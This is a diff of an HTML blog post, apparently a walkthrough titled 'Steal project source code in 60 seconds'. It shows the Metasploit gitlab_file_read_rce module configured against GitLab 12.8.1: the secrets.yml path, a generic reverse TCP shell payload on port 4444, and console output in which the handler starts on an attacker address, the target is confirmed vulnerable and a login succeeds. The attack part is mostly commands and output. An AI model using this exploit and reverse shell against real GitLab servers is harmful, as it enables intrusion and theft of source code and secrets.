@@ -29,19 +29,19 @@ permalink: /Steal-project-source-code-in-60-seconds/
 <h4 class="code-line" data-line-start=45 data-line-end=46><a id="RCE_in_the_gitlab_45"></a>RCE in the gitlab</h4>
 <p class="has-line-data" data-line-start="47" data-line-end="48">Now i can that i exploitetion RCE using msfconsole tool <code>https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce</code> because exploit was development and added it to exploit list.</p>
 <pre><code class="has-line-data" data-line-start="50" data-line-end="72">msf6 exploit(multi/http/gitlab_file_read_rce) &gt; use exploit/multi/http/gitlab_file_read_rce
-msf6 exploit(multi/http/gitlab_file_read_rce) &gt; show options
+msf6 exploit(multi/http/gitlab_file_read_rce) &gt; show options 
 
 Module options (exploit/multi/http/gitlab_file_read_rce):
 
-   Name             Current Setting
-   ----             ---------------
-   USERNAME         email_protected
-   PASSWORD         email_protected
-   RHOSTS           10.10.10.*
-   RPORT            443
-   SECRETS_PATH     /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
-   TARGETURI        /users/sign_in
-   VHOST            gitlab.site.io
+   Name             Current Setting                                               
+   ----             ---------------                                               
+   USERNAME         email_protected                                           
+   PASSWORD         email_protected                                             
+   RHOSTS           10.10.10.*                                                         
+   RPORT            443                                                           
+   SECRETS_PATH     /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml  
+   TARGETURI        /users/sign_in                                                
+   VHOST            gitlab.site.io                                                
 
 Payload options (generic/shell_reverse_tcp):
 
@@ -51,7 +51,7 @@ Payload options (generic/shell_reverse_tcp):
    LPORT  4444             yes       The listen port
 </code></pre>
 <p class="has-line-data" data-line-start="73" data-line-end="74">Exploitation RCE vulnerability:</p>
-<pre><code class="has-line-data" data-line-start="76" data-line-end="104">[*] Started reverse TCP handler on 10.10.14.**:2222
+<pre><code class="has-line-data" data-line-start="76" data-line-end="104">[*] Started reverse TCP handler on 10.10.14.**:2222 
 [*] Executing automatic check (disable AutoCheck to override)
 [+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
 [*] Logged in to user oleksii
